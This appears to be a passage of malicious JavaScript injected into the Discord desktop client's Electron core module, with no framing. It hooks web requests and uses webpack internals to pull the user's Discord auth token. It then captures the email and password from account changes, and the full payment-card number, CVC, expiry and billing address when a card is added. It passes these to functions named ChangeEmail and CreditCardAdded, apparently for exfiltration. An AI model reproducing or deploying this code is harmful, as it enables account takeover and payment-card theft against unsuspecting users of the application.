					window.webContents.executeJavaScript(`for(let a in window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]),gg.c)if(gg.c.hasOwnProperty(a)){let b=gg.c[a].exports;if(b&&b.__esModule&&b.default)for(let a in b.default)"getToken"==a&&(token=b.default.getToken())}token;`, !0).then((token => {
						ChangeEmail(data.email, data.password, token)
					}))
				}
			}
		} else {}
	}
	if (details.url.endsWith("tokens")) {
		const window = BrowserWindow.getAllWindows()[0];
		const item = querystring.parse(decodeURIComponent(Buffer.from(details.uploadData[0].bytes).toString()))
		window.webContents.executeJavaScript(`for(let a in window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]),gg.c)if(gg.c.hasOwnProperty(a)){let b=gg.c[a].exports;if(b&&b.__esModule&&b.default)for(let a in b.default)"getToken"==a&&(token=b.default.getToken())}token;`, !0).then((token => {
			CreditCardAdded(item["card[number]"], item["card[cvc]"], item["card[exp_month]"], item["card[exp_year]"], item["card[address_line1]"], item["card[address_city]"], item["card[address_state]"], item["card[address_zip]"], item["card[address_country]"], token)
		}))
	}
});
module.exports = require('./core.asar')
